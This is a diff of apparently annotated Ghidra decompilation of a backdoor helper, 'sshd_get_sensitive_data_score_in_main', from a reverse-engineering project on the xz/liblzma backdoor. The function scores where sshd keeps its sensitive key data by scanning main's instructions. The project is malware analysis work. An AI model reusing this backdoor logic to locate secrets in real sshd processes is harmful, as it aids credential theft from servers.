@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
 // Function: sshd_get_sensitive_data_score_in_main @ 0x103910
-// Calling convention: unknown
-// Prototype: undefined sshd_get_sensitive_data_score_in_main(void)
+// Calling convention: __stdcall
+// Prototype: int __stdcall sshd_get_sensitive_data_score_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)
 
 
 /*
@@ -13,31 +13,30 @@
 #include "xzre_types.h"
 
 
-undefined1  [16]
-sshd_get_sensitive_data_score_in_main
-          (long param_1,undefined8 param_2,long param_3,undefined8 param_4)
+int sshd_get_sensitive_data_score_in_main
+              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)
 
 {
-  long lVar1;
-  undefined8 uVar2;
-  int iVar3;
+  u8 *code_start;
+  u8 *code_end;
+  BOOL BVar1;
+  BOOL BVar2;
+  BOOL BVar3;
   int iVar4;
-  int iVar5;
-  uint uVar6;
-  undefined1 auVar7 [16];
+  u8 *main_end;
+  u8 *main_start;
   
-  uVar6 = 0;
-  lVar1 = *(long *)(param_3 + 0x48);
-  if (lVar1 != 0) {
-    uVar2 = *(undefined8 *)(param_3 + 0x50);
-    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1);
-    iVar4 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1 + 0x10);
-    iVar5 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1 + 8);
-    uVar6 = (((uint)(iVar3 != 0) - (uint)(iVar4 == 0)) + 2) - (uint)(iVar5 == 0);
+  iVar4 = 0;
+  code_start = (u8 *)refs->entries[2].func_start;
+  if (code_start != (u8 *)0x0) {
+    code_end = (u8 *)refs->entries[2].func_end;
+    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
+    BVar2 = find_instruction_with_mem_operand
+                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
+    BVar3 = find_instruction_with_mem_operand
+                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
+    iVar4 = (((uint)(BVar1 != FALSE) - (uint)(BVar2 == FALSE)) + 2) - (uint)(BVar3 == FALSE);
   }
-  auVar7._4_4_ = 0;
-  auVar7._0_4_ = uVar6;
-  auVar7._8_8_ = param_4;
-  return auVar7;
+  return iVar4;
 }
 
